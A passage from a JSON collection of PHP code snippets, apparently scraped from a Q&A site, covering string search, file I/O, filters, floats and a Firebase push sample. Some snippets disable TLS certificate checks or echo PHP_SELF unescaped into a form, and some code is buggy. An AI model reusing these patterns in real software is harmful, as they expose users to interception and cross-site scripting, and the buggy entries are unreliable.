    "description": "<?php  $str = \"NAME WITH SPACES FIELD1 FIELD2 FIELD3 FIELD4\";  preg_match(\"/(\\S+)\\s(\\S+)\\s(\\S+)\\s(\\S+)$/\", $str, $matches);  var_dump($matches);  /* array(5) {   [0] => string(27) \"FIELD1 FIELD2 FIELD3 FIELD4\"   [1] => string(6) \"FIELD1\"   [2] => string(6) \"FIELD2\"   [3] => string(6) \"FIELD3\"   [4] => string(6) \"FIELD4\" } */\nfunction getLastWord($string)     {         $string = explode(' ', $string);         $last_word = array_pop($string);         return $last_word;     }\n",
    "reg_date": "2021-10-12T10:18:08.000Z"
  },
  {
    "id": 3522,
    "keyword": null,
    "link": null,
    "title": " php extract time from datetime",
    "description": "$time = '2013-01-22 10:45:45';  echo $time = date(\"H:i:s\",strtotime($time));\n",
    "reg_date": "2021-10-12T10:18:08.000Z"
  },
  {
    "id": 3523,
    "keyword": null,
    "link": null,
    "title": " php factorial",
    "description": "function Factorial($n) {   \treturn ($n <= 1) ? 1 : $n * Factorial($n - 1); }\nfunction Factorial($number){      if($number <= 1){            return 1;        }        else{            return $number * Factorial($number - 1);        }    }     $number = 5;  $fact = Factorial($number);  echo \"Factorial = $fact\";  //output : 120 ?> \n<?php function Factorial($number){      if($number <= 1){            return 1;        }        else{            return $number * Factorial($number - 1);        }    }     $number = 5;  $fact = Factorial($number);  echo \"Factorial = $fact\";  //output : 120 ?> \n",
    "reg_date": "2021-10-12T10:18:08.000Z"
  },
  {
    "id": 3524,
    "keyword": null,
    "link": null,
    "title": " php fatal error: uncaught errorexception: method reflectionparameter::getclass() is deprecated",
    "description": "THE SOLUTION  As explained here latest version of laravel 6, 7 and 8 has made changes required for php 8. all you have to do is:  1- add php 8 to your composer.json (I've kept v7.4 just in case production server does not support php 8 yet)  \"php\": \"^7.4|^8.0\", 2- to run composer update to update your laravel to the latest version  composer update 3- make sure update the following libraries since they exist in all laravel applications  PHP to php:^8.0 Faker to fakerphp/faker:^1.9.1 PHPUnit to phpunit/phpunit:^9.3 4- check for any other library which needs to be updated, contribute if they haven't supported php 8. but you should be good to go with most of the libraries since they have active contributors.  EXPLAINING THE PROBLEM  as described here  PHP 8 introduces several improvements in PHP type systems such as the introduction of Union Types, mixed type, and a few more.  With these changes, certain methods in Reflection API's ReflectionParameter yield incorrect results.  In PHP 8, the following methods from ReflectionParameter class is deprecated:  ReflectionParameter::getClass() ReflectionParameter::isArray() ReflectionParameter::isCallable() ReflectionParamter::getType() is the recommended way to replace the deprecated methods. This method is available in PHP 7.0 and later.\n",
    "reg_date": "2021-10-12T10:18:09.000Z"
  },
  {
    "id": 3525,
    "keyword": null,
    "link": null,
    "title": " php favicon",
    "description": "<link rel=\"icon\" type=\"image/png\" href=\"logo.png\" />\n<link rel=\"shortcut icon\" href=\"favicon.ico\" type=\"image/x-icon\"/> \n",
    "reg_date": "2021-10-12T10:18:09.000Z"
  },
  {
    "id": 3526,
    "keyword": null,
    "link": null,
    "title": " php fetch mysql result as variable",
    "description": "<?php $result = mysql_query(\"SELECT id,email FROM people WHERE id = '42'\"); if (!$result) {     echo 'Could not run query: ' . mysql_error();     exit; } ?>\n",
    "reg_date": "2021-10-12T10:18:09.000Z"
  },
  {
    "id": 3527,
    "keyword": null,
    "link": null,
    "title": " php file download from url",
    "description": "$c = curl_init('https://yourURLhere.com'); curl_setopt($c, CURLOPT_RETURNTRANSFER, true); //curl_setopt(... other options you want...)  $html = curl_exec($c);  if (curl_error($c))     die(curl_error($c));  // Get the status code $status = curl_getinfo($c, CURLINFO_HTTP_CODE);  curl_close($c);\nSince PHP 5.1.0, file_put_contents() supports writing piece-by-piece by passing a stream-handle as the $data parameter:  file_put_contents(\"Tmpfile.zip\", fopen(\"http://someurl/file.zip\", 'r')); From the manual:  If data [that is the second argument] is a stream resource, the remaining buffer of that stream will be copied to the specified file. This is similar with using stream_copy_to_stream().  (Thanks Hakre.)\n",
    "reg_date": "2021-10-12T10:18:09.000Z"
  },
  {
    "id": 3528,
    "keyword": null,
    "link": null,
    "title": " php file exist",
    "description": "<?php $filename = '/path/to/foo.txt';  if (file_exists($filename)) {     echo \"The file $filename exists\"; } else {     echo \"The file $filename does not exist\"; } ?>\nif (!file_exists('http://mysite.com/images/thumbnail_1286954822.jpg')) {    $filefound = '0';                          }\nif (file_exists($filePath)) {   // todo acction }\nfile_exists ( string $filename ) : bool\n",
    "reg_date": "2021-10-12T10:18:09.000Z"
  },
  {
    "id": 3529,
    "keyword": null,
    "link": null,
    "title": " php file extension",
    "description": "$ext = pathinfo($filename, PATHINFO_EXTENSION);\n$ext = end(explode(\".\",file_name));\n<html>     <head>       <title>Reading a file using PHP</title>    </head>        <body>              <?php          $filename = \"tmp.txt\";          $file = fopen( $filename, \"r\" );                    if( $file == false ) {             echo ( \"Error in opening file\" );             exit();          }                    $filesize = filesize( $filename );          $filetext = fread( $file, $filesize );          fclose( $file );                    echo ( \"File size : $filesize bytes\" );          echo ( \"<pre>$filetext</pre>\" );       ?>           </body> </html> \n",
    "reg_date": "2021-10-12T10:18:09.000Z"
  },
  {
    "id": 3530,
    "keyword": null,
    "link": null,
    "title": " php file for image load",
    "description": "$image = 'path/to/image.jpg'; header('Content-Type: image/jpeg'); readfile($image);\n",
    "reg_date": "2021-10-12T10:18:09.000Z"
  },
  {
    "id": 3531,
    "keyword": null,
    "link": null,
    "title": " php file get content replacing & with &amp;",
    "description": "$myUrl = 'https://www.myurl.com?'; $myArray = [     'foo' => 'fooString',     'bar' => 'barString' ]; $myUrl .= http_build_query($myArray,'','&'); // https://www.myurl.com?foo=fooString&bar=barString $myData = file_get_contents($myUrl);\n",
    "reg_date": "2021-10-12T10:18:09.000Z"
  },
  {
    "id": 3532,
    "keyword": null,
    "link": null,
    "title": " php file get contents disable ssl check",
    "description": "<?php $arrContextOptions=array(     \"ssl\"=>array(         \"verify_peer\"=>false,         \"verify_peer_name\"=>false,     ), );    $response = file_get_contents(\"https://maps.co.weber.ut.us/arcgis/rest/services/SDE_composite_locator/GeocodeServer/findAddressCandidates?Street=&SingleLine=3042+N+1050+W&outFields=*&outSR=102100&searchExtent=&f=json\", false, stream_context_create($arrContextOptions));  echo $response; ?>\n",
    "reg_date": "2021-10-12T10:18:09.000Z"
  },
  {
    "id": 3533,
    "keyword": null,
    "link": null,
    "title": " php file get contents follow redirect",
    "description": "$context = stream_context_create(     array(         'http' => array(             'follow_location' => true/false         )     ) );  $html = file_get_contents('http://www.example.com/', false, $context);  var_dump($http_response_header); \n$ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_HEADER, TRUE); curl_setopt($ch, CURLOPT_FOLLOWLOCATION, FALSE); curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE); $a = curl_exec($ch); if(preg_match('#Location: (.*)#', $a, $r))  $l = trim($r[1]);\n",
    "reg_date": "2021-10-12T10:18:10.000Z"
  },
  {
    "id": 3534,
    "keyword": null,
    "link": null,
    "title": " php file put content",
    "description": "$data[] = $_POST['data'];  $inp = file_get_contents('results.json'); $tempArray = json_decode($inp); array_push($tempArray, $data); $jsonData = json_encode($tempArray); file_put_contents('results.json', $jsonData);\n<?php $data = [\"a@gmail2.com\" => [\"more\" => [\"yes\" => \"More\"]]];  $inp = file_get_contents('results.json'); $tempArray = json_decode($inp); array_push($tempArray, $data); $jsonData = json_encode($tempArray); file_put_contents('results.json', $jsonData);\nfile_put_contents ($filename, $data, $flags = 0, $context = null): int\n",
    "reg_date": "2021-10-12T10:18:10.000Z"
  },
  {
    "id": 3535,
    "keyword": null,
    "link": null,
    "title": " php file put contents",
    "description": "$data[] = $_POST['data'];  $inp = file_get_contents('results.json'); $tempArray = json_decode($inp); array_push($tempArray, $data); $jsonData = json_encode($tempArray); file_put_contents('results.json', $jsonData);\n#Superglobal  $_SERVER Superglobal Superglobals were introduced in PHP 4.1.0, and are built-in variables    that are always available in all scopes. Basically system variables. https://www.w3schools.com/php/php_superglobals.asp  Note: $_SERVER Superglobal  -- tells a little about the server and    the client  ============== #Example index.php <?php include 'server-info.php';?> <!DOCTYPE html> <html> <head>     <title>System Info</title>     <link rel=\"stylesheet\" href=\"https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css\"> </head> <body> <div class =\"container\">     <h1>Server & File Info</h1>     <?php if($server): ?>     <ul class=\"list-group\">     <?php foreach($server as $key => $value): ?>         <li class=\"list-group-item\">             <strong><?php echo $key; ?>: </strong>             <?php echo $value; ?>         </li>     <?php endforeach; ?>     </ul>      <?php endif; ?>      <h1>Client Info</h1>     <?php if($client): ?>     <ul class=\"list-group\">     <?php foreach($client as $key1 => $value1): ?>         <li class=\"list-group-item\">             <strong><?php echo $key1; ?>: </strong>             <?php echo $value1; ?>         </li>     <?php endforeach; ?>     </ul>      <?php endif; ?>  </body> </html> ================== #Example server-info.php <?php     # $_SERVER SUPERGLOBAL      //Create Server Array     $server =[         'Host Server Name' => $_SERVER['SERVER_NAME'],         'Http Host' => $_SERVER['HTTP_HOST'],         'Server Software' => $_SERVER['SERVER_SOFTWARE'],         'Document Root' => $_SERVER['DOCUMENT_ROOT'],         'Current Page' =>  $_SERVER['PHP_SELF'],         'Script Name' =>  $_SERVER['SCRIPT_NAME'],         'Absloute Path' =>  $_SERVER['SCRIPT_FILENAME']      ];      echo $server['Host Server Name'];     echo $server['Http Host'];     echo $server['Server Software'];     echo $server['Document Root'];     echo $server['Current Page'];     echo $server['Script Name'];     echo '<br>';     //also can show it all     print_r($server);      //Creat Client Array     $client = [         'Client System Info' => $_SERVER['HTTP_USER_AGENT'],         'Client IP' => $_SERVER['REMOTE_ADDR'],         'Remote Port' => $_SERVER['REMOTE_PORT']      ];     echo '<br>';     echo '<br>';     print_r($client);  ?>\nfile_put_contents ($filename, $data, $flags = 0, $context = null): int\n<?php  \t$filename = \"test.txt\"; \t$data = \"hi this I am https://t.me/mrbeandev\"; \tfile_put_contents($filename,$data);  ?>\n",
    "reg_date": "2021-10-12T10:18:10.000Z"
  },
  {
    "id": 3536,
    "keyword": null,
    "link": null,
    "title": " php file read",
    "description": "/* In php to read file first you have to use 'fopen' method to open the file after that you perform different operation on it. Like Reading file, Writing file etc.    TO read file data we have to use 'fread' method. */  <?php $myfile = fopen(\"read_text_file.txt\", \"r\") or die(\"Unable to open file!\"); echo fread($myfile,filesize(\"read_text_file.txt\")); fclose($myfile); ?>    /* I hope it will help you. Namaste Stay Home Stay Safe */\n<?php   echo file_get_contents(\"text.txt\"); ?>\n",
    "reg_date": "2021-10-12T10:18:10.000Z"
  },
  {
    "id": 3537,
    "keyword": null,
    "link": null,
    "title": " php files",
    "description": "<html>     <head>       <title>Reading a file using PHP</title>    </head>        <body>              <?php          $filename = \"tmp.txt\";          $file = fopen( $filename, \"r\" );                    if( $file == false ) {             echo ( \"Error in opening file\" );             exit();          }                    $filesize = filesize( $filename );          $filetext = fread( $file, $filesize );          fclose( $file );                    echo ( \"File size : $filesize bytes\" );          echo ( \"<pre>$filetext</pre>\" );       ?>           </body> </html> \n<html>     <head>       <title>Reading a file using PHP</title>    </head>        <body>              <?php          $filename = \"abc.txt\";          $file = fopen( $filename, \"r\" );                    if( $file == false ) {             echo ( \"Error in opening file\" );             exit();          }                    $filesize = filesize( $filename );          $filetext = fread( $file, $filesize );          fclose( $file );                    echo ( \"File size : $filesize bytes\" );          echo ( \"<pre>$filetext</pre>\" );       ?>           </body> </html>         //This is a php File Yes!!!!!\nPHP files can contain text, HTML, CSS, JavaScript, and PHP code. PHP code is executed on the server, and the result is returned to the browser as plain HTML. PHP files have extension \".php\n",
    "reg_date": "2021-10-12T10:18:10.000Z"
  },
  {
    "id": 3538,
    "keyword": null,
    "link": null,
    "title": " php filter array",
    "description": "$my_array = ['foo' => 1, 'hello' => 'world']; $allowed  = ['foo', 'bar']; $filtered = array_filter(     $my_array,     function ($key) use ($allowed) {         return in_array($key, $allowed);     },     ARRAY_FILTER_USE_KEY );\n$numbers = [2, 4, 6, 8, 10];  function MyFunction($number) {   return $number > 5; }  $filteredArray = array_filter($numbers, \"MyFunction\");  /**  * `$filteredArray` now contains: `[6, 8, 10]`  * NB: Use this to remove what you don't want in the array  * @see `array_map` when you want to alter/change elements  * in the array.  */\n <?php  $arr = ['a' => 1, 'b' => 2, 'c' => 3, 'd' => 4];  var_dump(array_filter($arr, function($k) {     return $k == 'b'; }, ARRAY_FILTER_USE_KEY));  var_dump(array_filter($arr, function($v, $k) {     return $k == 'b' || $v == 4; }, ARRAY_FILTER_USE_BOTH)); ?>  \n$array = [1, 2, 3, 4, 5];  $filtered = array_filter($array, function($item) {     return $item != 4; // Return (include) current item if expression is truthy });  // $filtered = [1, 2, 3, 5]\n$numbers = [-2, 4, -6, 8, 10];  function isPositive($number) {   return $number > 0; }  $filteredArray = array_filter($numbers, \"isPositive\"); \narray_filter example\n",
    "reg_date": "2021-10-12T10:18:10.000Z"
  },
  {
    "id": 3539,
    "keyword": null,
    "link": null,
    "title": " php filter name",
    "description": "//You should use a regex filter with preg_match who returns 1 or 0  // this filter works for most of cases and will return 0 if not a regular string name  /* use this regex */ preg_match(\"/^[a-z ,.'-]+$/i\", your_string);\n",
    "reg_date": "2021-10-12T10:18:10.000Z"
  },
  {
    "id": 3540,
    "keyword": null,
    "link": null,
    "title": " php filter non utf-8 characters",
    "description": "function remove_bs($Str) {     $StrArr = str_split($Str); $NewStr = '';   foreach ($StrArr as $Char) {         $CharNo = ord($Char);     if ($CharNo == 163) { $NewStr .= $Char; continue; } // keep &pound;      if ($CharNo > 31 && $CharNo < 127) {       $NewStr .= $Char;         }   }     return $NewStr; }\n",
    "reg_date": "2021-10-12T10:18:10.000Z"
  },
  {
    "id": 3541,
    "keyword": null,
    "link": null,
    "title": " php filter only numbers",
    "description": "$output = preg_replace( '/[^0-9]/', '', $string );\n",
    "reg_date": "2021-10-12T10:18:10.000Z"
  },
  {
    "id": 3542,
    "keyword": null,
    "link": null,
    "title": " php filter validate email",
    "description": "<?php $email_a = 'joe@example.com'; $email_b = 'bogus';  if (filter_var($email_a, FILTER_VALIDATE_EMAIL)) {     echo \"L'adresse email '$email_a' est consid&eacute;r&eacute;e comme valide.\"; } if (filter_var($email_b, FILTER_VALIDATE_EMAIL)) {     echo \"L'adresse email '$email_b' est consid&eacute;r&eacute;e comme valide.\"; } else {     echo \"L'adresse email '$email_b' est consid&eacute;r&eacute;e comme invalide.\"; } ?>\n",
    "reg_date": "2021-10-12T10:18:11.000Z"
  },
  {
    "id": 3543,
    "keyword": null,
    "link": null,
    "title": " php filter var boolean",
    "description": "$bool = filter_var(\"1\", FILTER_VALIDATE_BOOLEAN); // true $bool = filter_var(\"true\", FILTER_VALIDATE_BOOLEAN); // true $bool = filter_var(\"yes\", FILTER_VALIDATE_BOOLEAN); // true $bool = filter_var(\"on\", FILTER_VALIDATE_BOOLEAN); // true $bool = filter_var(\"anythingElse\", FILTER_VALIDATE_BOOLEAN); // false\n",
    "reg_date": "2021-10-12T10:18:11.000Z"
  },
  {
    "id": 3544,
    "keyword": null,
    "link": null,
    "title": " php filter var mail",
    "description": "<?php var_dump(filter_var('bob@example.com', FILTER_VALIDATE_EMAIL));\n",
    "reg_date": "2021-10-12T10:18:11.000Z"
  },
  {
    "id": 3545,
    "keyword": null,
    "link": null,
    "title": " php filters",
    "description": "# sanitize form data function clean($data) {     $data = htmlspecialchars($data);     $data = stripslashes($data);     $data = trim($data);     return $data; }\n#Filter Validation  <?php     //checks for posted data     /*     if(filter_has_var(INPUT_POST,'data')){         echo 'Data Found';     }else{         echo 'No Data';     }     */     if(filter_has_var(INPUT_POST,'data')){         //remove illegal chars         $email = $_POST['data'];         $email = filter_var($email, FILTER_SANITIZE_EMAIL);         echo $email.'<br>';       //validate as an email address      if(filter_input(INPUT_POST, 'data', FILTER_VALIDATE_EMAIL)){         echo 'Email is Valid';      }else{         echo 'Email is not Valid';      }           //we can use the below if we use the sanatizer above      if(filter_var($email, FILTER_VALIDATE_EMAIL)){         echo 'Email is Valid';      }else{         echo 'Email is not Valid';     } }     #Other Validations     #FILTER_VALIDATE_BOOLEAN     #FILTER_VALIDATE_EMAIL     #FILTER_VALIDATE_FLOAT     #FILTER_VALIDATE_INT     #FILTER_VALIDATE_IP     #FILTER_VALIDATE_REGEXP  'REGULAR EXPRESSION'     #FILTER_VALIDATE_URL      #Other sanatizes     #FILTER_SANATIZE_EMAIL     #FILTER_SANATIZE_ENCODED     #FILTER_SANATIZE_NUMBER_FLOAT     #FILTER_SANATIZE_NUMBER_INT     #FILTER_SANATIZE_SPECIAL_CHARS     #FILTER_SANATIZE_STRING     #FILTER_SANATIZE_URL      //EXAMPLE int VALIDATION     $var = 'john';     if(filter_var($var, FILTER_VALIDATE_INT)){         echo '<br>'.$var.' is a number<br>';     }else{         echo '<br>'.$var.' is not a number'.'<br>';     }      //EXAMPLE int Sanitazion     $var2 = '33k2dsdffgsdf3563sdf';     var_dump(filter_var($var2, FILTER_SANITIZE_NUMBER_INT));      //ARRAY USAGE     $filters = array(         \"data\" => FILTER_VALIDATE_EMAIL,         \"data2\" => array(             \"filter\" => FILTER_VALIDATE_INT,             \"options\" => array(                 \"min_range\" => 1,                 \"max_range\" => 100         )         )     );     print_r(filter_input_array(INPUT_POST, $filters));  ?>  <form method =\"post\" action=\"<?php echo $_SERVER['PHP_SELF'];?>\">     <input type=\"text\" name=\"data\">     <input type=\"text\" name=\"data2\">     <button type=\"submit\">Submit</button> </form>\n",
    "reg_date": "2021-10-12T10:18:11.000Z"
  },
  {
    "id": 3546,
    "keyword": null,
    "link": null,
    "title": " php find differences between two arrays",
    "description": " <?php $array1 = array(\"a\" => \"green\", \"red\", \"blue\", \"red\"); $array2 = array(\"b\" => \"green\", \"yellow\", \"red\"); $result = array_diff($array1, $array2);  print_r($result); ?>  Array (     [1] => blue )\n",
    "reg_date": "2021-10-12T10:18:11.000Z"
  },
  {
    "id": 3547,
    "keyword": null,
    "link": null,
    "title": " php find first occurrence in string",
    "description": "#You can use the strpos() function   $cheese = \"cheese\";  strpos($cheese, 'h');  #Output: 1\n",
    "reg_date": "2021-10-12T10:18:11.000Z"
  },
  {
    "id": 3548,
    "keyword": null,
    "link": null,
    "title": " php find if string contains",
    "description": "$myString = 'Hello Bob how are you?';  if (strpos($myString, 'Bob') !== false) {      echo \"My string contains Bob\";  }\nif (strpos($string, 'substring') !== false) { \t// do stuff  }\n$mystring = 'abc'; $findme   = 'a'; $pos = strpos($mystring, $findme);\n// returns true if $needle is a substring of $haystack function contains($haystack, $needle){     return strpos($haystack, $needle) !== false; }\n$myString = 'Hello Bob how are you?'; if (strpos($myString, 'Bob') !== false) {     echo \"My string contains Bob\"; }\nphpCopy<?php $mystring = \"This is a PHP program.\";  if (strpos($mystring, \"program.\") !== false) {     echo(\"True\"); } ?> \n",
    "reg_date": "2021-10-12T10:18:11.000Z"
  },
  {
    "id": 3549,
    "keyword": null,
    "link": null,
    "title": " php find if substring is in string",
    "description": "$myString = 'Hello Bob how are you?';  if (strpos($myString, 'Bob') !== false) {      echo \"My string contains Bob\";  }\n$result = strpos(\"haystack\", \"needle\");  if ($result != false) {   // text found }\n// this method is new with PHP 8 and above $haystack = \"Damn, I wonder if this string contains a comma.\"; if (str_contains($haystack, \",\")) { \techo \"There is a comma!!\"; }\n",
    "reg_date": "2021-10-12T10:18:11.000Z"
  },
  {
    "id": 3550,
    "keyword": null,
    "link": null,
    "title": " php find key in array",
    "description": "// Here's our fruity array $fruits = ['apple', 'pear', 'banana'];  // Use it in an `if` statement if (array_key_exists(\"banana\", $fruits)) {  // Do stuff because `banana` exists }  // Store it for later use $exists = array_key_exists(\"peach\", $fruits);\n <?php $search_array = array('first' => null, 'second' => 4);  // returns false isset($search_array['first']);  // returns true array_key_exists('first', $search_array); ?>  \n<?php $search_array = array('first' => 1, 'second' => 4); if (array_key_exists('first', $search_array)) {     echo \"The 'first' element is in the array\"; } ?> \n <?php $array = array(0 => 'blue', 1 => 'red', 2 => 'green', 3 => 'red');  $key = array_search('green', $array); // $key = 2; $key = array_search('red', $array);   // $key = 1; ?>  \n$people = array(   2 => array(     'name' => 'John',     'fav_color' => 'green'   ),   5=> array(     'name' => 'Samuel',     'fav_color' => 'blue'   )); $found_key = array_search('blue', array_column($people, 'fav_color'));\n$arr = array(     \"one\" => 1,     \"two\" => 2,     \"three\" => 3,     \"seventeen\" => 17 ); function find($mot){      global $arr; // this is global variable   $ok=false;  foreach ($arr as $k => $v)      {       if($k==$mot){         return $v; $ok=true; // or return true;       }     }   if(ok==false){ return -1; }  // or return false; }  //call function echo find(\"two\");\n",
    "reg_date": "2021-10-12T10:18:11.000Z"
  },
  {
    "id": 3551,
    "keyword": null,
    "link": null,
    "title": " php find lowest value in associative array",
    "description": "$a = [ \t['emp_id' => '1', 'name' => 'ram', 'age' => 40], \t['emp_id' => '5', 'name' => 'ram_1', 'age' => 20], \t['emp_id' => '2', 'name' => 'ram_2', 'age' => 30], \t['emp_id' => '3', 'name' => 'ram_4', 'age' => 25], \t['emp_id' => '4', 'name' => 'ram_3', 'age' => 50]  ]; // please find minimum age employee in above array.  echo min($newArray);\n",
    "reg_date": "2021-10-12T10:18:11.000Z"
  },
  {
    "id": 3552,
    "keyword": null,
    "link": null,
    "title": " php find multiple strings in string",
    "description": "if(preg_match('(bad|naughty)', $data) === 1) { } \n",
    "reg_date": "2021-10-12T10:18:11.000Z"
  },
  {
    "id": 3553,
    "keyword": null,
    "link": null,
    "title": " php find string in string",
    "description": "$a = 'How are you?';  if (strpos($a, 'are') !== false) {     echo 'true'; }\n <?php $mystring = 'abc'; $findme   = 'a'; $pos = strpos($mystring, $findme);  // Note our use of ===.  Simply == would not work as expected // because the position of 'a' was the 0th (first) character. if ($pos === false) {     echo \"The string '$findme' was not found in the string '$mystring'\"; } else {     echo \"The string '$findme' was found in the string '$mystring'\";     echo \" and exists at position $pos\"; } ?>  \n$mystring = 'abc'; $findme   = 'a'; $pos = strpos($mystring, $findme);\n//Find the position of the first occurrence of a substring in a string $mystring = 'abc'; $findme   = 'a'; $pos = strpos($mystring, $findme);\n$pos = strpos(\"find the position of X in here\", \"X\");\n <?php $mystring = 'abc'; $findme   = 'a'; $pos = strpos($mystring, $findme);  // El operador !== tambi&eacute;n puede ser usado. Puesto que != no funcionar&aacute; como se espera // porque la posici&oacute;n de 'a' es 0. La declaraci&oacute;n (0 != false) se eval&uacute;a a  // false. if ($pos !== false) {      echo \"La cadena '$findme' fue encontrada en la cadena '$mystring'\";          echo \" y existe en la posici&oacute;n $pos\"; } else {      echo \"La cadena '$findme' no fue encontrada en la cadena '$mystring'\"; } ?>  \n",
    "reg_date": "2021-10-12T10:18:12.000Z"
  },
  {
    "id": 3554,
    "keyword": null,
    "link": null,
    "title": " php find text in variable",
    "description": "if(strpos($comments, 'http://') !== false) { \n",
    "reg_date": "2021-10-12T10:18:12.000Z"
  },
  {
    "id": 3555,
    "keyword": null,
    "link": null,
    "title": " php firebase push notification sample",
    "description": "#API access key from Google API's Console     define( 'API_ACCESS_KEY', 'YOUR-SERVER-API-ACCESS-KEY-GOES-HERE' );     $registrationIds = $_GET['id'];  #prep the bundle      $msg = array           ( \t\t'body' \t=> 'Body  Of Notification', \t\t'title'\t=> 'Title Of Notification',              \t'icon'\t=> 'myicon',/*Default Icon*/               \t'sound' => 'mySound'/*Default sound*/           );  \t$fields = array \t\t\t( \t\t\t\t'to'\t\t=> $registrationIds, \t\t\t\t'notification'\t=> $msg \t\t\t); \t \t \t$headers = array \t\t\t( \t\t\t\t'Authorization: key=' . API_ACCESS_KEY, \t\t\t\t'Content-Type: application/json' \t\t\t);  #Send Reponse To FireBase Server\t \t\t$ch = curl_init(); \t\tcurl_setopt( $ch,CURLOPT_URL, 'https://fcm.googleapis.com/fcm/send' ); \t\tcurl_setopt( $ch,CURLOPT_POST, true ); \t\tcurl_setopt( $ch,CURLOPT_HTTPHEADER, $headers ); \t\tcurl_setopt( $ch,CURLOPT_RETURNTRANSFER, true ); \t\tcurl_setopt( $ch,CURLOPT_SSL_VERIFYPEER, false ); \t\tcurl_setopt( $ch,CURLOPT_POSTFIELDS, json_encode( $fields ) ); \t\t$result = curl_exec($ch ); \t\tcurl_close( $ch );  #Echo Result Of FireBase Server echo $result;  #https://gist.github.com/MohammadaliMirhamed/7384b741a5c979eb13633dc6ea1269ce \n",
    "reg_date": "2021-10-12T10:18:12.000Z"
  },
  {
    "id": 3556,
    "keyword": null,
    "link": null,
    "title": " php float 2 decimais",
    "description": "$num = 5; $num = number_format($num, 2);\n$foo = \"105\"; echo number_format((float)$foo, 2, '.', '');\n",
    "reg_date": "2021-10-12T10:18:12.000Z"
  },
  {
    "id": 3557,
    "keyword": null,
    "link": null,
    "title": " php float precision",
    "description": "<?php var_dump(round(3.4)); // =>3 var_dump(round(3.5)); // =>4 var_dump(round(3.6)); // =>4 var_dump(round(3.6, 0)); // =>4 var_dump(round(5.045, 2)); // =>5.05 var_dump(round(5.055, 2)); // =>5.06 var_dump(round(345, -2)); // =>300 var_dump(round(345, -3)); // =>0 var_dump(round(678, -2)); // =>700 var_dump(round(678, -3));  // =>1000 ?>\nfloatval ($var) \n For people interest in Differential Equations, I've done a function that receive a string like: x^2+x^3 and put it in 2x+3x^2 witch is the differantial of the previous equation.  In the code there is one thing missing: the $string{$i} is often going outOfBound (Uninitialized string offset: 6 in...) if your error setting is set a little too high... I just dont know how to fix this.  So there is the code for differential equation with (+ and -) only:  <? function differentiel($equa) {     $equa = strtolower($equa);     echo \"Equation de depart: \".$equa.\"<br>\";     $final = \"\";           for($i = 0; $i < strlen($equa); $i++)     {         //Make a new string from the receive $equa         if($equa{$i} == \"x\" && $equa{$i+1} == \"^\")         {             $final .= $equa{$i+2};             $final .= \"x^\";             $final .= $equa{$i+2}-1;         }         elseif($equa{$i} == \"+\" || $equa{$i} == \"-\")         {             $final .= $equa{$i};         }         elseif(is_numeric($equa{$i}) && $i == 0)         {             //gerer parenthese et autre terme generaux + gerer ^apres: 2^2             $final .= $equa{$i}.\"*\";         }         elseif(is_numeric($equa{$i}) && $i > 0 && $equa{$i-1} != \"^\")         {             //gerer ^apres: 2^2             $final .= $equa{$i}.\"*\";         }         elseif($equa{$i} == \"^\")         {             continue;         }         elseif(is_numeric($equa{$i}) && $equa{$i-1} == \"^\")         {             continue;         }         else         {             if($equa{$i} == \"x\")             {                 $final .= 1;             }             else             {                 $final .= $equa{$i};              }         }     }     //     //Manage multiplication add in the previous string $final     //     $finalMul = \"\";     for($i = 0; $i < strlen($final); $i++)     {         if(is_numeric($final{$i}) && $final{$i+1} == \"*\" && is_numeric($final{$i+2}))         {             $finalMul .= $final{$i}*$final{$i+2};         }         elseif($final{$i} == \"*\")         {             continue;         }         elseif(is_numeric($final{$i}) && $final{$i+1} != \"*\" && $final{$i-1} == \"*\")         {             continue;         }         else         {             $finalMul .= $final{$i};             }     }     echo \"equa final: \".$finalMul; } ?>  I know this is not optimal but i've done this quick :) If you guys have any comment just email me. I also want to do this fonction In C to add to phpCore maybe soon... Patoff \n",
    "reg_date": "2021-10-12T10:18:12.000Z"
  },
  {
    "id": 3558,
    "keyword": null,
    "link": null,
    "title": " php float to int",
    "description": "intval($string);\n$stringVal = \"12.06\"; $stringConvertedToFloat = floatval( $stringVal ); // The floatval function will return the argument converted // to a float value if the value can be converted. // IF the value cannot be converted these are the values that will be // returned: // Empty Array: returns 0. eg: floatval([]); // Non-Empty Array: returns 1. eg: floatval([\"ab\", \"12\"]) // String with a non-numeric value as the left most character: returns 0. eg: floatval(\"ab12\") // String with one or more numeric values as the left most characters: returns those characters as a float. eg: floatval(\"12ab1\") will return 12. // Oh the joys of php\n$int = intval($float);\ns = \"123\"; echo intval(s); // 123  s = \"hello\"; echo intval(s);\t//0\n$num = \"3.14\";  $int = (int)$num;//string to int $float = (float)$num;//string to float\n$num = \"3.14\"; $int = (int)$num;\n",
    "reg_date": "2021-10-12T10:18:12.000Z"
  },
  {
    "id": 3559,
    "keyword": null,
    "link": null,
    "title": " php float value",
    "description": "$stringVal = \"12.06\"; $stringConvertedToFloat = floatval( $stringVal ); // The floatval function will return the argument converted // to a float value if the value can be converted. // IF the value cannot be converted these are the values that will be // returned: // Empty Array: returns 0. eg: floatval([]); // Non-Empty Array: returns 1. eg: floatval([\"ab\", \"12\"]) // String with a non-numeric value as the left most character: returns 0. eg: floatval(\"ab12\") // String with one or more numeric values as the left most characters: returns those characters as a float. eg: floatval(\"12ab1\") will return 12. // Oh the joys of php\n$floatValue = floatval(\"1.0\");\nfloatval ($var) \nphpCopy<?php $mystring = \"0.5674\"; echo(\"This float number is of string data type \"); echo($mystring); echo(\"\\n\"); $myfloat = number_format($mystring, 4); echo(\"Now, this float number is of float data type \"); echo($myfloat); ?> \nparseFloat( num.toFixed(2) ) \n",
    "reg_date": "2021-10-12T10:18:12.000Z"
  },
  {
    "id": 3560,
    "keyword": null,
    "link": null,
    "title": " php for",
